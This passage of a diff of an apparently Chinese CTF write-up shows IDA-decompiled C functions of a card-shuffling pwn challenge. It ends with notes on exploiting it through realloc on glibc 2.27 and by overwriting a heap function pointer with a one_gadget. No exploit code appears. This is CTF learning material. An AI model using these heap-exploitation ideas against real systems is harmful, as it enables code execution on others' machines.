+  obj<span class="token operator">-&gt;</span>list_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">list</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">realloc</span><span class="token punctuation">(</span>obj<span class="token operator">-&gt;</span>list_ptr<span class="token punctuation">,</span> <span class="token number">8LL</span> <span class="token operator">*</span> obj<span class="token operator">-&gt;</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
-  <span class="token punctuation">&#123;</span>
-    count1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>obj<span class="token operator">-></span>count<span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>count1 <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    count1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>obj<span class="token operator">-&gt;</span>count<span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">&gt;=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>count1 <span class="token punctuation">)</span>
       <span class="token keyword">break</span><span class="token punctuation">;</span>
-    count1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>obj<span class="token operator">-></span>range<span class="token punctuation">;</span>
+    count1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>obj<span class="token operator">-&gt;</span>range<span class="token punctuation">;</span>
     <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>count1 <span class="token punctuation">)</span>
       <span class="token keyword">break</span><span class="token punctuation">;</span>
-    v1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>obj<span class="token operator">-></span>list_ptr<span class="token operator">-></span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token operator">*</span>v1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">16LL</span> <span class="token operator">*</span> obj<span class="token operator">-></span>range<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 1</span>
-    <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> obj<span class="token operator">-></span>range<span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
-      obj<span class="token operator">-></span>list_ptr<span class="token operator">-></span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>out_idx <span class="token operator">=</span> i<span class="token punctuation">;</span>
-      obj<span class="token operator">-></span>list_ptr<span class="token operator">-></span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>in_idx <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-  <span class="token punctuation">&#125;</span>
+    v1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>obj<span class="token operator">-&gt;</span>list_ptr<span class="token operator">-&gt;</span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token operator">*</span>v1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">16LL</span> <span class="token operator">*</span> obj<span class="token operator">-&gt;</span>range<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 1</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> obj<span class="token operator">-&gt;</span>range<span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
+      obj<span class="token operator">-&gt;</span>list_ptr<span class="token operator">-&gt;</span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>out_idx <span class="token operator">=</span> i<span class="token punctuation">;</span>
+      obj<span class="token operator">-&gt;</span>list_ptr<span class="token operator">-&gt;</span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>in_idx <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span>
   <span class="token keyword">if</span> <span class="token punctuation">(</span> random_lvl_ptr <span class="token punctuation">)</span>
-  <span class="token punctuation">&#123;</span>
-    obj<span class="token operator">-></span>ptr_record <span class="token operator">=</span> random_lvl_ptr<span class="token punctuation">;</span>
+  <span class="token punctuation">{</span>
+    obj<span class="token operator">-&gt;</span>ptr_record <span class="token operator">=</span> random_lvl_ptr<span class="token punctuation">;</span>
     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"new suite set:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> obj<span class="token operator">-></span>ptr_record<span class="token punctuation">,</span> <span class="token number">4</span> <span class="token operator">*</span> obj<span class="token operator">-></span>count<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 2</span>
-  <span class="token punctuation">&#125;</span>
+    <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> obj<span class="token operator">-&gt;</span>ptr_record<span class="token punctuation">,</span> <span class="token number">4</span> <span class="token operator">*</span> obj<span class="token operator">-&gt;</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 2</span>
+  <span class="token punctuation">}</span>
   <span class="token keyword">return</span> count1<span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><code>getinfo</code></p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">sub_D31</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">cards</span> <span class="token operator">*</span>cards<span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
-  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"suit count is %d\n"</span><span class="token punctuation">,</span> cards<span class="token operator">-></span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"digit range: 1 - %d\n"</span><span class="token punctuation">,</span> cards<span class="token operator">-></span>range<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"suit chara set:%s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>cards<span class="token operator">-></span>ptr_record<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"randomize level:%lld\n"</span><span class="token punctuation">,</span> cards<span class="token operator">-></span>random_lvl_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">{</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"suit count is %d\n"</span><span class="token punctuation">,</span> cards<span class="token operator">-&gt;</span>count<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"digit range: 1 - %d\n"</span><span class="token punctuation">,</span> cards<span class="token operator">-&gt;</span>range<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"suit chara set:%s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>cards<span class="token operator">-&gt;</span>ptr_record<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"randomize level:%lld\n"</span><span class="token punctuation">,</span> cards<span class="token operator">-&gt;</span>random_lvl_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><code>shuffle</code></p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token operator">*</span>__fastcall <span class="token function">shuffle</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">cards</span> <span class="token operator">*</span>structs<span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
   <span class="token keyword">struct</span> <span class="token class-name">list_content</span> <span class="token operator">*</span>ext1<span class="token punctuation">;</span> <span class="token comment">// rax</span>
   <span class="token keyword">struct</span> <span class="token class-name">list_content</span> <span class="token operator">*</span>ext2<span class="token punctuation">;</span> <span class="token comment">// rdx</span>
   <span class="token keyword">struct</span> <span class="token class-name">list_content</span> <span class="token operator">*</span>ext1_1<span class="token punctuation">;</span> <span class="token comment">// rcx</span>
@@ -368,33 +538,33 @@
   <span class="token keyword">unsigned</span> __int64 in_idx1<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-8h]</span>
 
   <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
-  <span class="token punctuation">&#123;</span>
-    random_lvl_ptr <span class="token operator">=</span> structs<span class="token operator">-></span>random_lvl_ptr<span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">>=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>random_lvl_ptr <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    random_lvl_ptr <span class="token operator">=</span> structs<span class="token operator">-&gt;</span>random_lvl_ptr<span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> i <span class="token operator">&gt;=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>random_lvl_ptr <span class="token punctuation">)</span>
       <span class="token keyword">break</span><span class="token punctuation">;</span>
-    idx1 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> structs<span class="token operator">-></span>count<span class="token punctuation">;</span>
-    idx2 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> structs<span class="token operator">-></span>count<span class="token punctuation">;</span>
-    ran1 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> structs<span class="token operator">-></span>range<span class="token punctuation">;</span>
-    ran2 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> structs<span class="token operator">-></span>range<span class="token punctuation">;</span>
-    ext1 <span class="token operator">=</span> <span class="token operator">&amp;</span>structs<span class="token operator">-></span>list_ptr<span class="token operator">-></span>content<span class="token punctuation">[</span>idx1<span class="token punctuation">]</span><span class="token punctuation">[</span>ran1<span class="token punctuation">]</span><span class="token punctuation">;</span>
-    out_idx1 <span class="token operator">=</span> ext1<span class="token operator">-></span>out_idx<span class="token punctuation">;</span>
-    in_idx1 <span class="token operator">=</span> ext1<span class="token operator">-></span>in_idx<span class="token punctuation">;</span>
-    ext2 <span class="token operator">=</span> <span class="token operator">&amp;</span>structs<span class="token operator">-></span>list_ptr<span class="token operator">-></span>content<span class="token punctuation">[</span>idx2<span class="token punctuation">]</span><span class="token punctuation">[</span>ran2<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    idx1 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> structs<span class="token operator">-&gt;</span>count<span class="token punctuation">;</span>
+    idx2 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> structs<span class="token operator">-&gt;</span>count<span class="token punctuation">;</span>
+    ran1 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> structs<span class="token operator">-&gt;</span>range<span class="token punctuation">;</span>
+    ran2 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> structs<span class="token operator">-&gt;</span>range<span class="token punctuation">;</span>
+    ext1 <span class="token operator">=</span> <span class="token operator">&amp;</span>structs<span class="token operator">-&gt;</span>list_ptr<span class="token operator">-&gt;</span>content<span class="token punctuation">[</span>idx1<span class="token punctuation">]</span><span class="token punctuation">[</span>ran1<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    out_idx1 <span class="token operator">=</span> ext1<span class="token operator">-&gt;</span>out_idx<span class="token punctuation">;</span>
+    in_idx1 <span class="token operator">=</span> ext1<span class="token operator">-&gt;</span>in_idx<span class="token punctuation">;</span>
+    ext2 <span class="token operator">=</span> <span class="token operator">&amp;</span>structs<span class="token operator">-&gt;</span>list_ptr<span class="token operator">-&gt;</span>content<span class="token punctuation">[</span>idx2<span class="token punctuation">]</span><span class="token punctuation">[</span>ran2<span class="token punctuation">]</span><span class="token punctuation">;</span>
     ext1_1 <span class="token operator">=</span> ext1<span class="token punctuation">;</span>
-    out_idx2 <span class="token operator">=</span> ext2<span class="token operator">-></span>out_idx<span class="token punctuation">;</span>
-    in_idx2 <span class="token operator">=</span> ext2<span class="token operator">-></span>in_idx<span class="token punctuation">;</span>
-    ext1_1<span class="token operator">-></span>out_idx <span class="token operator">=</span> out_idx2<span class="token punctuation">;</span>
-    ext1_1<span class="token operator">-></span>in_idx <span class="token operator">=</span> in_idx2<span class="token punctuation">;</span>
-    v6 <span class="token operator">=</span> <span class="token operator">&amp;</span>structs<span class="token operator">-></span>list_ptr<span class="token operator">-></span>content<span class="token punctuation">[</span>idx2<span class="token punctuation">]</span><span class="token punctuation">[</span>ran2<span class="token punctuation">]</span><span class="token punctuation">;</span>
-    v6<span class="token operator">-></span>out_idx <span class="token operator">=</span> out_idx1<span class="token punctuation">;</span>
-    v6<span class="token operator">-></span>in_idx <span class="token operator">=</span> in_idx1<span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span>
+    out_idx2 <span class="token operator">=</span> ext2<span class="token operator">-&gt;</span>out_idx<span class="token punctuation">;</span>
+    in_idx2 <span class="token operator">=</span> ext2<span class="token operator">-&gt;</span>in_idx<span class="token punctuation">;</span>
+    ext1_1<span class="token operator">-&gt;</span>out_idx <span class="token operator">=</span> out_idx2<span class="token punctuation">;</span>
+    ext1_1<span class="token operator">-&gt;</span>in_idx <span class="token operator">=</span> in_idx2<span class="token punctuation">;</span>
+    v6 <span class="token operator">=</span> <span class="token operator">&amp;</span>structs<span class="token operator">-&gt;</span>list_ptr<span class="token operator">-&gt;</span>content<span class="token punctuation">[</span>idx2<span class="token punctuation">]</span><span class="token punctuation">[</span>ran2<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    v6<span class="token operator">-&gt;</span>out_idx <span class="token operator">=</span> out_idx1<span class="token punctuation">;</span>
+    v6<span class="token operator">-&gt;</span>in_idx <span class="token operator">=</span> in_idx1<span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
   <span class="token keyword">return</span> random_lvl_ptr<span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><code>show</code></p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">show_EF8</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">cards</span> <span class="token operator">*</span>structs<span class="token punctuation">)</span>
-<span class="token punctuation">&#123;</span>
+<span class="token punctuation">{</span>
   <span class="token keyword">int</span> count<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-1B0h]</span>
   <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-1B0h]</span>
   <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-1ACh]</span>
@@ -407,51 +577,51 @@
   v9 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
   v4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-  <span class="token keyword">while</span> <span class="token punctuation">(</span> count <span class="token operator">&lt;</span> structs<span class="token operator">-></span>count <span class="token punctuation">)</span>
-  <span class="token punctuation">&#123;</span>
+  <span class="token keyword">while</span> <span class="token punctuation">(</span> count <span class="token operator">&lt;</span> structs<span class="token operator">-&gt;</span>count <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
     n4 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">128</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>i <span class="token operator">&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>structs<span class="token operator">-></span>ptr_record <span class="token operator">+</span> v4<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">/=</span> <span class="token number">2</span> <span class="token punctuation">)</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">128</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>i <span class="token operator">&amp;</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span>structs<span class="token operator">-&gt;</span>ptr_record <span class="token operator">+</span> v4<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">/=</span> <span class="token number">2</span> <span class="token punctuation">)</span>
       <span class="token operator">++</span>n4<span class="token punctuation">;</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span> n4 <span class="token operator">></span> <span class="token number">4</span> <span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span> n4 <span class="token operator">&gt;</span> <span class="token number">4</span> <span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
       <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"invalid suit table!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
       <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">}</span>
     v8<span class="token punctuation">[</span>count<span class="token punctuation">]</span> <span class="token operator">=</span> v4<span class="token punctuation">;</span>
     v8<span class="token punctuation">[</span>count <span class="token operator">+</span> <span class="token number">52</span><span class="token punctuation">]</span> <span class="token operator">=</span> n4<span class="token punctuation">;</span>
     v4 <span class="token operator">+=</span> n4<span class="token punctuation">;</span>
     count <span class="token operator">+=</span> n4 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span>
-  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> structs<span class="token operator">-></span>count<span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
-  <span class="token punctuation">&#123;</span>
-    <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> structs<span class="token operator">-></span>range<span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>
-    <span class="token punctuation">&#123;</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> structs<span class="token operator">-&gt;</span>count<span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> structs<span class="token operator">-&gt;</span>range<span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>
       <span class="token function">write</span><span class="token punctuation">(</span>
         <span class="token number">1</span><span class="token punctuation">,</span>
-        <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>structs<span class="token operator">-></span>ptr_record <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v8<span class="token punctuation">[</span>structs<span class="token operator">-></span>list_ptr<span class="token operator">-></span>content<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>out_idx<span class="token punctuation">]</span><span class="token punctuation">,</span>
-        <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v8<span class="token punctuation">[</span>structs<span class="token operator">-></span>list_ptr<span class="token operator">-></span>content<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>out_idx <span class="token operator">+</span> <span class="token number">52</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" %2lld "</span><span class="token punctuation">,</span> structs<span class="token operator">-></span>list_ptr<span class="token operator">-></span>content<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>in_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>structs<span class="token operator">-&gt;</span>ptr_record <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v8<span class="token punctuation">[</span>structs<span class="token operator">-&gt;</span>list_ptr<span class="token operator">-&gt;</span>content<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>out_idx<span class="token punctuation">]</span><span class="token punctuation">,</span>
+        <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v8<span class="token punctuation">[</span>structs<span class="token operator">-&gt;</span>list_ptr<span class="token operator">-&gt;</span>content<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>out_idx <span class="token operator">+</span> <span class="token number">52</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" %2lld "</span><span class="token punctuation">,</span> structs<span class="token operator">-&gt;</span>list_ptr<span class="token operator">-&gt;</span>content<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>in_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
     <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s_<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">}</span>
   <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v9<span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>整个程序没有 <code>free</code>，但是有 <code>realloc</code>。<br>glibc 版本 2.27.<br>堆上存在一个指针调用函数的位置，考虑可以用来改写为 one_gadget。</p>
-<h1 id="15mins-初步猜测"><a href="#15mins-初步猜测" class="headerlink" title="15mins 初步猜测"></a>15mins 初步猜测</h1><p>参考 <a target="_blank" rel="noopener" href="https://www.eqqie.cn/index.php/archives/1400/">REALLOC</a>，发现 <code>realloc</code> 有很多特性。<br>假如设置 <code>count</code> &#x3D; 0，释放 <code>random_lvl</code> 和 <code>list_ptr</code>，那么不会导致后面的 <code>setinfo</code> 赋值报错（<code>i &gt;= count</code> 会退出循环），但是无法读取和 <code>shuffle</code>。<br>猜测是利用 <code>init</code> 的恢复操作，配合 <code>realloc</code> 释放堆和重新申请堆来制造申请 bss 或重叠堆的条件。</p>
